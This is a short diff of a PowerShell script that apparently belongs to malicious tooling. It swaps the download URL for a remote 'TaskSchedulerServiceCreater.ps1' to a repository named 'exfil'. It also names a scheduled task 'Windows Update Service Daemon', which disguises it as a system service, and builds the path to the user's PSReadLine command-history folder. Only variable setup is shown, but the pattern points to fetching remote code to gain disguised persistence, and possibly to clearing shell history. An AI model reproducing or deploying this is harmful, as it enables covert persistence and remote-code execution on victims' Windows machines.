@@ -2,7 +2,7 @@
 # Variables.
 $AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
 foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
-$urlfortc = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/TaskSchedulerServiceCreater.ps1"
+$urlfortc = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/TaskSchedulerServiceCreater.ps1"
 $STName = "Windows Update Service Daemon"
 $psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
 
